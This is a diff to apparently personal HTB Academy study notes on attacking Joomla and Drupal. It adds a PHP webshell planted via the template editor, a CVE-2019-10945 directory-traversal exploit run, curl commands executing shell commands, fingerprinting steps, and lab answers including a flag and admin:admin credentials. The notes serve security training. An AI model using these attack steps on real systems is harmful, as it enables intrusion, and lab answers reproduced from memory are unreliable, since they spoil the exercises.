@@ -1,6 +1,6 @@
 # HTB Academy — Attacking Common Applications: Module Notes
 
-**Status:** In progress (Sections 1–5 of 33 complete)
+**Status:** In progress (Sections 1–7 of 33 complete)
 
 ---
 
@@ -239,6 +239,58 @@ sudo python3 joomla-brute.py -u http://<target> -w /usr/share/metasploit-framewo
 ### Lab Answers (app.inlanefreight.local)
 - Q1 version: `3.10.0`
 - Q2 password: `turnkey`
+
+---
+
+## Section 6 — Attacking Joomla
+
+### RCE via Template Editor (requires admin)
+1. Login to `/administrator` → Configuration → Templates → protostar → error.php
+2. Add `system($_GET[0]);` → Save & Close
+3. Execute: `curl -s "http://<target>/templates/protostar/error.php?0=id"`
+
+### CVE-2019-10945 — Directory Traversal (Joomla 1.5.0–3.9.4)
+```
+git clone https://github.com/dpgg101/CVE-2019-10945
+python3 CVE-2019-10945/CVE-2019-10945.py --url "http://<target>/administrator/" --username admin --password admin --dir /
+```
+Lists webroot contents — look for flag files, then read via webshell or direct URL.
+
+**Workflow:** dir traversal finds the flag filename → webshell reads it:
+```
+curl -s "http://<target>/templates/protostar/error.php?0=cat%20/var/www/<vhost>/<flagfile>"
+```
+
+---
+
+## Section 7 — Drupal: Discovery & Enumeration
+
+### Fingerprinting
+```
+curl -s http://<target>/ | grep Drupal
+curl -s http://<target>/CHANGELOG.txt | grep -m2 ""
+curl -s http://<target>/robots.txt | grep node
+```
+CHANGELOG.txt gives exact version on older installs — newer Drupal blocks it (404).
+
+### Automated Enumeration
+```
+droopescan scan drupal -u http://<target>/
+```
+More capable for Drupal than Joomla. Finds plugins, version, interesting URLs.
+
+### Key Paths
+- Admin login: `/user/login`
+- Version: `/CHANGELOG.txt`, `/README.txt`
+- Nodes: `/node/<id>` — identifies Drupal even with custom themes
+
+### Lab Answers
+- drupal-qa.inlanefreight.local version: `7.30`
+
+---
+
+### Lab Answers (dev.inlanefreight.local — Joomla 3.9.4, admin:admin)
+- Q1 flag: `j00mla_c0re_d1rtrav3rsal!` (flag_6470e394cbf6dab6a91682cc8585059b.txt in webroot)
 
 ---
 
